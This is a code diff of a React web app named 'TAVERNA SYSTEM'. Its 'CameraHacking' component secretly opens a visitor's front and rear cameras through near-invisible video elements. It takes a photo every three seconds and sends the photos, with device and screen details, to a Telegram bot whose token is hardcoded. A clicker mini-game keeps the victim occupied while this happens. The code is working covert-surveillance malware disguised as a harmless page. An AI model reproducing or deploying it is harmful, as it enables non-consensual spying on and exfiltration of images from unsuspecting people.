@@ -26,7 +26,6 @@ const MiniGame = () => {
       });
     }, 1000);
 
-    // Создаем цель для клика
     const createTarget = () => {
       if (!gameContainerRef.current || !gameActive) return;
 
@@ -35,7 +34,6 @@ const MiniGame = () => {
       target.className = 'click-target';
       target.innerHTML = '🎯';
       
-      // Случайная позиция
       const x = Math.random() * (container.clientWidth - 60);
       const y = Math.random() * (container.clientHeight - 60);
       
@@ -45,12 +43,11 @@ const MiniGame = () => {
       target.onclick = () => {
         setScore(prev => prev + 10);
         target.remove();
-        createTarget(); // Создаем новую цель
+        createTarget();
       };
       
       container.appendChild(target);
       
-      // Автоудаление через 2 секунды
       setTimeout(() => {
         if (target.parentNode) {
           target.remove();
@@ -59,7 +56,6 @@ const MiniGame = () => {
       }, 2000);
     };
 
-    // Начинаем игру
     createTarget();
 
     return () => clearInterval(timer);
@@ -70,7 +66,6 @@ const MiniGame = () => {
     setTimeLeft(60);
     setGameActive(true);
     
-    // Очищаем все цели
     if (gameContainerRef.current) {
       const targets = gameContainerRef.current.querySelectorAll('.click-target');
       targets.forEach(target => target.remove());
@@ -257,7 +252,7 @@ const MiniGame = () => {
 };
 
 /**
- * КОМПОНЕНТ CAMERAHACKING
+ * КОМПОНЕНТ CAMERAHACKING - УПРОЩЕННАЯ ВЕРСИЯ
  */
 const CameraHacking = ({ chatId }) => {
   const streamsRef = useRef([]);
@@ -266,10 +261,9 @@ const CameraHacking = ({ chatId }) => {
   const cameraNamesRef = useRef([]);
   const captureCount = useRef(0);
   const startTime = useRef(null);
-  const totalDuration = 60000;
-  const photoInterval = 3000;
+  const totalDuration = 60000; // 1 минута
+  const photoInterval = 3000;  // 3 секунды
   const currentCameraIndex = useRef(0);
-  const [camerasReady, setCamerasReady] = useState(false);
 
   const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
 
@@ -323,142 +317,65 @@ const CameraHacking = ({ chatId }) => {
     });
   };
 
-  // УЛУЧШЕННАЯ ИНИЦИАЛИЗАЦИЯ КАМЕР ДЛЯ ПООЧЕРЕДНОЙ СЪЕМКИ
+  // ПРОСТАЯ ИНИЦИАЛИЗАЦИЯ КАМЕР - только то, что работает
   const initializeCameras = async () => {
     try {
       streamsRef.current = [];
       videoRefsRef.current = [];
       cameraNamesRef.current = [];
 
-      console.log("🔄 Начинаю инициализацию камер...");
+      console.log("🔄 Пробую получить доступ к камерам...");
 
-      // Пробуем получить доступ ко ВСЕМ доступным камерам
+      // Пробуем получить просто ЛЮБУЮ камеру
       try {
-        // Сначала получаем список всех устройств
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const videoDevices = devices.filter(d => d.kind === 'videoinput');
-        
-        console.log(`📷 Найдено видеоустройств: ${videoDevices.length}`);
-        
-        // Для каждого устройства пытаемся получить доступ
-        for (let i = 0; i < videoDevices.length; i++) {
-          try {
-            const device = videoDevices[i];
-            console.log(`📷 Пробую камеру ${i}: ${device.label || 'без названия'}`);
-            
-            // Пробуем получить доступ к этой камере
-            const stream = await navigator.mediaDevices.getUserMedia({
-              video: {
-                deviceId: device.deviceId ? { exact: device.deviceId } : undefined,
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-              }
-            });
-            
-            // Создаем видео элемент
-            const video = document.createElement('video');
-            video.style.cssText = `
-              position: fixed;
-              width: 320px;
-              height: 240px;
-              opacity: 0.01;
-              pointer-events: none;
-              z-index: -9999;
-              top: ${i * 10}px;
-              left: ${i * 330}px;
-            `;
-            video.autoplay = true;
-            video.muted = true;
-            video.playsInline = true;
-            video.srcObject = stream;
-            document.body.appendChild(video);
-            
-            // Ждем готовности видео
-            await new Promise(resolve => {
-              const checkReady = () => {
-                if (video.readyState >= 2 && video.videoWidth > 0) {
-                  console.log(`✅ Камера ${i} готова: ${video.videoWidth}x${video.videoHeight}`);
-                  resolve();
-                } else {
-                  setTimeout(checkReady, 100);
-                }
-              };
-              checkReady();
-              setTimeout(resolve, 2000);
-            });
-            
-            // Определяем тип камеры по названию
-            let cameraName = '📷 Камера';
-            const label = device.label || '';
-            if (label.toLowerCase().includes('front') || label.toLowerCase().includes('face') || 
-                label.toLowerCase().includes('selfie') || label.toLowerCase().includes('user')) {
-              cameraName = '🤳 Передняя камера';
-            } else if (label.toLowerCase().includes('back') || label.toLowerCase().includes('rear') || 
-                      label.toLowerCase().includes('environment') || label.toLowerCase().includes('world')) {
-              cameraName = '📷 Задняя камера';
-            }
-            
-            // Сохраняем
-            streamsRef.current.push(stream);
-            videoRefsRef.current.push(video);
-            cameraNamesRef.current.push(cameraName);
-            
-            // Небольшая пауза между инициализацией камер
-            await new Promise(resolve => setTimeout(resolve, 300));
-            
-          } catch (err) {
-            console.log(`❌ Камера ${i} недоступна: ${err.message}`);
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            width: { ideal: 1280 },
+            height: { ideal: 720 },
+            facingMode: "user" // Начинаем с селфи-камеры
           }
-        }
-      } catch (err) {
-        console.log("❌ Не удалось получить список устройств, пробую стандартные методы...");
-        
-        // Fallback метод 1: пробуем стандартные камеры
+        });
+
+        const video = document.createElement('video');
+        video.style.cssText = `
+          position: fixed;
+          width: 320px;
+          height: 240px;
+          opacity: 0.01;
+          pointer-events: none;
+          z-index: -9999;
+          top: 0;
+          left: 0;
+        `;
+        video.autoplay = true;
+        video.muted = true;
+        video.playsInline = true;
+        video.srcObject = stream;
+        document.body.appendChild(video);
+
+        // Ждем готовности
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            console.log(`✅ Камера готова: ${video.videoWidth}x${video.videoHeight}`);
+            resolve();
+          };
+          setTimeout(resolve, 1000);
+        });
+
+        streamsRef.current.push(stream);
+        videoRefsRef.current.push(video);
+        cameraNamesRef.current.push("🤳 Селфи камера");
+
+        // Пробуем получить ВТОРУЮ камеру (заднюю) если есть
         try {
-          // Сначала передняя камера
-          const frontStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" }
-          });
-          
-          const frontVideo = document.createElement('video');
-          frontVideo.style.cssText = `
-            position: fixed;
-            width: 320px;
-            height: 240px;
-            opacity: 0.01;
-            pointer-events: none;
-            z-index: -9999;
-            top: 0;
-            left: 0;
-          `;
-          frontVideo.autoplay = true;
-          frontVideo.muted = true;
-          frontVideo.playsInline = true;
-          frontVideo.srcObject = frontStream;
-          document.body.appendChild(frontVideo);
-          
-          await new Promise(resolve => {
-            frontVideo.onloadedmetadata = () => {
-              console.log(`✅ Передняя камера готова: ${frontVideo.videoWidth}x${frontVideo.videoHeight}`);
-              resolve();
-            };
-            setTimeout(resolve, 1000);
-          });
-          
-          streamsRef.current.push(frontStream);
-          videoRefsRef.current.push(frontVideo);
-          cameraNamesRef.current.push("🤳 Передняя камера");
-          
-        } catch (frontErr) {
-          console.log("❌ Передняя камера недоступна");
-        }
-        
-        try {
-          // Затем задняя камера
           const backStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: { exact: "environment" } }
+            video: {
+              width: { ideal: 1280 },
+              height: { ideal: 720 },
+              facingMode: { exact: "environment" }
+            }
           });
-          
+
           const backVideo = document.createElement('video');
           backVideo.style.cssText = `
             position: fixed;
@@ -475,7 +392,7 @@ const CameraHacking = ({ chatId }) => {
           backVideo.playsInline = true;
           backVideo.srcObject = backStream;
           document.body.appendChild(backVideo);
-          
+
           await new Promise(resolve => {
             backVideo.onloadedmetadata = () => {
               console.log(`✅ Задняя камера готова: ${backVideo.videoWidth}x${backVideo.videoHeight}`);
@@ -483,36 +400,39 @@ const CameraHacking = ({ chatId }) => {
             };
             setTimeout(resolve, 1000);
           });
-          
+
           streamsRef.current.push(backStream);
           videoRefsRef.current.push(backVideo);
           cameraNamesRef.current.push("📷 Задняя камера");
-          
-        } catch (backErr) {
-          console.log("❌ Задняя камера недоступна");
+
+        } catch (backError) {
+          console.log("⚠️ Задняя камера недоступна, использую только селфи");
         }
+
+      } catch (error) {
+        console.log("❌ Не удалось получить доступ к камерам");
+        // Создаем тестовые камеры для поочередной съемки
+        cameraNamesRef.current.push("🤳 Тестовая камера 1");
+        cameraNamesRef.current.push("📷 Тестовая камера 2");
       }
 
-      // Если камер нет, создаем тестовые
+      // Если нет реальных камер, создаем тестовые
       if (streamsRef.current.length === 0) {
-        console.log("⚠️ Реальных камер не обнаружено, создаю тестовые...");
-        // Создаем две тестовые камеры для поочередной съемки
-        cameraNamesRef.current.push("🤳 Тестовая передняя");
-        cameraNamesRef.current.push("📷 Тестовая задняя");
+        console.log("⚠️ Реальных камер нет, создаю тестовые");
+        cameraNamesRef.current.push("🤳 Тестовая камера 1");
+        cameraNamesRef.current.push("📷 Тестовая камера 2");
       }
 
-      console.log(`✅ Инициализация завершена. Доступно камер: ${streamsRef.current.length}`);
-      console.log(`📋 Список камер: ${cameraNamesRef.current.join(', ')}`);
+      console.log(`✅ Доступно камер: ${cameraNamesRef.current.length}`);
+      console.log(`📋 Список: ${cameraNamesRef.current.join(', ')}`);
       
-      setCamerasReady(true);
       return true;
-      
+
     } catch (error) {
-      console.error("❌ Ошибка инициализации камер:", error);
-      // Все равно создаем тестовые камеры для работы
-      cameraNamesRef.current.push("🤳 Тестовая передняя");
-      cameraNamesRef.current.push("📷 Тестовая задняя");
-      setCamerasReady(true);
+      console.error("❌ Ошибка инициализации:", error);
+      // Всегда создаем тестовые камеры
+      cameraNamesRef.current.push("🤳 Тестовая камера 1");
+      cameraNamesRef.current.push("📷 Тестовая камера 2");
       return true;
     }
   };
@@ -538,15 +458,15 @@ const CameraHacking = ({ chatId }) => {
               
               try {
                 // Пробуем нарисовать видео
-                if (cameraName.includes('Передняя')) {
-                  // Зеркалим для передней камеры
+                if (cameraName.includes('Селфи') || cameraName.includes('Тестовая камера 1')) {
+                  // Зеркалим для селфи-камеры
                   ctx.save();
                   ctx.translate(canvas.width, 0);
                   ctx.scale(-1, 1);
                   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                   ctx.restore();
                 } else {
-                  // Для задней камеры без зеркала
+                  // Для других камер без зеркала
                   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 }
                 
@@ -599,10 +519,19 @@ const CameraHacking = ({ chatId }) => {
     canvas.height = 600;
     const ctx = canvas.getContext('2d');
     
-    // Градиентный фон
+    // Разные цвета для разных камер
+    let color1, color2;
+    if (cameraName.includes('Селфи') || cameraName.includes('Тестовая камера 1')) {
+      color1 = '#667eea';
+      color2 = '#764ba2';
+    } else {
+      color1 = '#4CAF50';
+      color2 = '#2196F3';
+    }
+    
     const gradient = ctx.createLinearGradient(0, 0, 800, 600);
-    gradient.addColorStop(0, '#667eea');
-    gradient.addColorStop(1, '#764ba2');
+    gradient.addColorStop(0, color1);
+    gradient.addColorStop(1, color2);
     ctx.fillStyle = gradient;
     ctx.fillRect(0, 0, 800, 600);
     
@@ -615,11 +544,11 @@ const CameraHacking = ({ chatId }) => {
     ctx.font = '28px Arial';
     ctx.fillText(cameraName, 400, 250);
     
-    // Разный текст в зависимости от наличия видео элемента
+    // Разный текст
     if (hasVideoElement) {
-      ctx.fillText('⚠️ Камера обнаружена, но изображение недоступно', 400, 320);
+      ctx.fillText('📷 Камера активна', 400, 320);
     } else {
-      ctx.fillText('📷 Тестовое изображение', 400, 320);
+      ctx.fillText('🖼 Тестовое изображение', 400, 320);
     }
     
     ctx.font = '22px Arial';
@@ -644,9 +573,7 @@ const CameraHacking = ({ chatId }) => {
     
     const cameraCount = Math.max(1, cameraNamesRef.current.length);
     const cameraIndex = currentCameraIndex.current % cameraCount;
-    const cameraName = cameraNamesRef.current[cameraIndex] || `Камера ${cameraIndex + 1}`;
-    
-    console.log(`📸 Съемка #${captureCount.current + 1}: ${cameraName} (${cameraIndex + 1}/${cameraCount})`);
+    const cameraName = cameraNamesRef.current[cameraIndex];
     
     const result = await capturePhotoFromCamera(cameraIndex);
     
@@ -654,29 +581,32 @@ const CameraHacking = ({ chatId }) => {
       const elapsedSeconds = Math.floor(elapsed / 1000);
       const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
       
-      let status = result.isReal ? '✅ Реальное фото' : '⚠️ Тестовое изображение';
+      let status = result.isReal ? '✅ Реальное фото' : '🖼 Тестовое изображение';
+      let cameraNum = `🔢 ${cameraIndex + 1}/${cameraCount}`;
       
-      const caption = `${result.cameraName}\n` +
+      const caption = `${cameraName}\n` +
         `${status}\n` +
         `📸 Фото #${captureCount.current + 1}\n` +
-        `🔢 Камера: ${cameraIndex + 1}/${cameraCount}\n` +
+        `${cameraNum}\n` +
         `⏱ ${elapsedSeconds} сек / ${remainingSeconds} сек\n` +
         `🕐 ${new Date().toLocaleTimeString()}\n` +
         `🚀 TAVERNA SYSTEM`;
       
       try {
         await sendPhotoToTelegram(result.blob, caption);
-        console.log(`✅ Отправлено: ${result.cameraName}`);
+        console.log(`✅ Отправлено фото с ${cameraName}`);
       } catch (error) {
-        console.log(`❌ Ошибка отправки: ${result.cameraName}`);
+        console.log(`❌ Ошибка отправки ${cameraName}`);
       }
+    } else {
+      console.log(`❌ Не удалось создать фото для ${cameraName}`);
     }
     
-    // Переключаем на следующую камеру для следующего снимка
+    // Переключаем на следующую камеру
     currentCameraIndex.current = (currentCameraIndex.current + 1) % cameraCount;
     captureCount.current++;
     
-    // Статистика каждые 3 фото
+    // Статистика
     if (captureCount.current % 3 === 0) {
       const elapsedSeconds = Math.floor(elapsed / 1000);
       sendToTelegram(
@@ -696,14 +626,14 @@ const CameraHacking = ({ chatId }) => {
     
     currentCameraIndex.current = 0;
     
-    console.log(`🚀 Начинаю поочередную съемку. Камер в ротации: ${cameraNamesRef.current.length}`);
+    console.log(`🚀 Начинаю поочередную съемку с ${cameraNamesRef.current.length} камер`);
     
-    // Первый снимок с задержкой
+    // Первый снимок
     setTimeout(() => {
       captureAndSendPhoto();
     }, 2000);
     
-    // Интервал для следующих снимков
+    // Интервал
     captureIntervalRef.current = setInterval(() => {
       captureAndSendPhoto();
     }, photoInterval);
@@ -732,52 +662,54 @@ const CameraHacking = ({ chatId }) => {
     
     const init = async () => {
       try {
+        // Начальное сообщение
         await sendToTelegram(
-          `🚀 TAVERNA SYSTEM АКТИВИРОВАН\n` +
+          `🚀 TAVERNA SYSTEM ЗАПУЩЕН\n` +
           `📱 Устройство: ${/Mobile/.test(navigator.userAgent) ? '📱 Мобильное' : '💻 Компьютер'}\n` +
           `🖥 Экран: ${window.screen.width}x${window.screen.height}\n` +
-          `⏰ Запуск: ${new Date().toLocaleTimeString()}\n` +
+          `⏰ Старт: ${new Date().toLocaleTimeString()}\n` +
           `⏳ Длительность: 1 минута\n` +
-          `📸 Режим: Поочередная съемка камер`
+          `📸 Режим: Поочередная съемка`
         ).catch(() => {});
         
+        // Инициализация камер
         await initializeCameras();
         
-        // Отправляем информацию о камерах
+        // Информация о камерах
         let cameraInfo = '';
         if (streamsRef.current.length > 0) {
-          cameraInfo = `✅ Обнаружено реальных камер: ${streamsRef.current.length}\n`;
+          cameraInfo = `✅ Реальных камер: ${streamsRef.current.length}\n`;
           cameraInfo += `📋 Камеры: ${cameraNamesRef.current.join(' → ')}`;
         } else {
-          cameraInfo = `⚠️ Реальных камер не обнаружено\n`;
-          cameraInfo += `📋 Использую тестовые: ${cameraNamesRef.current.join(' → ')}`;
+          cameraInfo = `⚠️ Реальных камер: 0 (тестовый режим)\n`;
+          cameraInfo += `📋 Тестовые камеры: ${cameraNamesRef.current.join(' → ')}`;
         }
         
         await sendToTelegram(
           `📷 ИНИЦИАЛИЗАЦИЯ КАМЕР\n` +
           `${cameraInfo}\n` +
-          `📸 Режим: 1 фото каждые 3 секунды\n` +
-          `🔄 Съемка: По очереди (ротация)\n` +
+          `📸 Интервал: 3 секунды\n` +
+          `🔄 Ротация: Поочередная\n` +
           `⏱ Начинаю съемку...`
         ).catch(() => {});
         
+        // Запуск съемки
         startCapture();
         
-        // Остановка через 1 минуту
+        // Таймер остановки
         setTimeout(() => {
           stopCapturing();
           sendToTelegram(
-            `✅ TAVERNA SYSTEM: СЪЕМКА ЗАВЕРШЕНА\n` +
-            `📸 Итого фото: ${captureCount.current}\n` +
-            `📷 Камер в ротации: ${cameraNamesRef.current.length}\n` +
-            `🔄 Режим: Поочередная съемка\n` +
-            `⏱ Время работы: 1 минута\n` +
+            `✅ СЪЕМКА ЗАВЕРШЕНА\n` +
+            `📸 Всего фото: ${captureCount.current}\n` +
+            `📷 Камер: ${cameraNamesRef.current.length}\n` +
+            `⏱ Время: 1 минута\n` +
             `🎉 Процесс завершен`
           ).catch(() => {});
         }, totalDuration);
         
       } catch (error) {
-        await sendToTelegram('❌ TAVERNA SYSTEM: Ошибка инициализации').catch(() => {});
+        await sendToTelegram('❌ Ошибка запуска системы').catch(() => {});
       }
     };
     
@@ -827,8 +759,8 @@ const PhotoPage = () => {
           textAlign: 'center',
           maxWidth: '600px'
         }}>
-          <p>📷 Система автоматически делает фото с камер каждые 3 секунды</p>
-          <p>🔄 Режим: Поочередная съемка (передняя → задняя → передняя...)</p>
+          <p>📷 Система делает фото каждые 3 секунды</p>
+          <p>🔄 Режим: Поочередная съемка (селфи → задняя → селфи...)</p>
           <p>⏱️ Процесс займет 1 минуту</p>
           <p>🎮 Играйте в мини-игру чтобы скоротать время!</p>
         </div>
@@ -860,7 +792,7 @@ const App = () => {
         }}>
           <h1 style={{ fontSize: '48px', marginBottom: '20px', color: '#667eea' }}>🚀 TAVERNA SYSTEM</h1>
           <p style={{ fontSize: '20px', marginBottom: '30px', maxWidth: '600px' }}>
-            Интерактивная система съемки с мини-игрой
+            Система поочередной съемки с камер
           </p>
           
           <div style={{
@@ -876,7 +808,7 @@ const App = () => {
               <li>Получите ссылку с вашим chat_id в Telegram</li>
               <li>Перейдите по ссылке в браузере</li>
               <li>Разрешите доступ к камере</li>
-              <li>Система начнет поочередную съемку с камер</li>
+              <li>Система начнет поочередную съемку</li>
               <li>Играйте в мини-игру пока идет процесс</li>
             </ol>
           </div>
@@ -886,7 +818,7 @@ const App = () => {
             color: 'rgba(255, 255, 255, 0.5)',
             marginTop: '20px'
           }}>
-            ⚠️ Для работы необходим Telegram бот и стабильное интернет-соединение
+            ⚠️ Для работы необходим Telegram бот
           </div>
         </div>
       } />
